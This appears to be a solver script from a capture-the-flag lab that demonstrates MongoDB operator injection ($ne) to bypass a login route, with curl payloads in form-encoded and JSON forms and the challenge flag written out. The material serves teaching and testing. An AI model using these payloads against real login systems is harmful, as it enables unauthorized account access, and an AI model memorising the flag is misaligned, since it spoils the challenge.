#!/usr/bin/env bash
# solvers/p4_2.sh — Task 4.2 "Bypassing the Archive Guardian" canonical exploit.
#
# The guardian console's login route builds its MongoDB query directly out
# of raw request input:
#
#     db.agents.find_one({"username": username, "password": password})
#
# and never checks that either field is actually a string before it reaches
# that query (challenges/phase4.py, p4_2 block). An ordinary caller sends
# two flat strings and gets an ordinary two-field equality match — ordinary
# login behavior. But if `username`/`password` arrive as *dicts* instead —
# `{"$ne": null}` in a JSON body, or `username[$ne]=1&password[$ne]=1` as
# form-encoded bracket-notation keys (rebuilt into the same nested dict
# app-side) — MongoDB doesn't compare the dict as a literal. It honors it
# as a real operator: "$ne": null/1 matches any document where that field
# exists and isn't literally null/1, i.e. every seeded agent. The query
# matches without supplying a single real credential, and the route logs
# the caller in as whatever `find_one` (no explicit sort — real MongoDB
# natural order) returns first.
#
# This script proves three things against the live stack, in order:
#
#   1. A normal wrong-password login (two plain strings) genuinely FAILS —
#      this isn't "any input logs you in," it's specifically the operator
#      injection that works.
#   2. The form-encoded bracket-notation bypass (username[$ne]=1&
#      password[$ne]=1) logs in as the guardian account and reveals the
#      flag.
#   3. The equivalent JSON-body bypass ({"$ne": null} on both fields) does
#      the same, over a completely different request-parsing path.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{ne_null_walks_in}"
ROUTE="${BASE}/p4/guardian"

fail=0

echo "[p4_2] target: ${ROUTE}"

# --- Step 1 — a genuine wrong-password login must FAIL --------------------
echo "[p4_2] step 1 — legitimate login with a wrong/guessed plain-string password"
echo "  POST username=guardian&password=totally-wrong-guess"

legit_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode "username=guardian" \
    --data-urlencode "password=totally-wrong-guess")
echo "  response: ${legit_resp}"

if echo "$legit_resp" | grep -qF "$FLAG"; then
    echo "[p4_2] FAIL: a wrong plain-string password logged in successfully — the"
    echo "  route is accepting any credential, not specifically the operator"
    echo "  injection this lesson is about."
    fail=1
else
    echo "  ok: wrong plain-string password was correctly rejected (no flag)"
fi

# --- Step 2 — form-encoded bracket-notation operator bypass ---------------
echo "[p4_2] step 2 — form-encoded bypass: username[\$ne]=1&password[\$ne]=1"

form_resp=$(curl -s -X POST "$ROUTE" \
    -H "Accept: application/json" \
    --data-urlencode 'username[$ne]=1' \
    --data-urlencode 'password[$ne]=1')
echo "  response: ${form_resp}"

if echo "$form_resp" | grep -qF "$FLAG"; then
    echo "  ok: form-encoded \$ne bypass logged in as the guardian — flag recovered: ${FLAG}"
else
    echo "[p4_2] FAIL: flag did not appear in the form-encoded bypass response"
    fail=1
fi

# --- Step 3 — JSON-body operator bypass ------------------------------------
echo '[p4_2] step 3 — JSON-body bypass: {"username":{"$ne":null},"password":{"$ne":null}}'

json_resp=$(curl -s -X POST "$ROUTE" \
    -H "Content-Type: application/json" \
    -H "Accept: application/json" \
    -d '{"username":{"$ne":null},"password":{"$ne":null}}')
echo "  response: ${json_resp}"

if echo "$json_resp" | grep -qF "$FLAG"; then
    echo "  ok: JSON-body \$ne bypass logged in as the guardian — flag recovered: ${FLAG}"
else
    echo "[p4_2] FAIL: flag did not appear in the JSON-body bypass response"
    fail=1
fi

if [ "$fail" -ne 0 ]; then
    echo "[p4_2] FAIL"
    exit 1
fi

echo "[p4_2] ok: wrong password rejected, both bypass styles logged in as the guardian"
echo "[p4_2] PASS"
exit 0
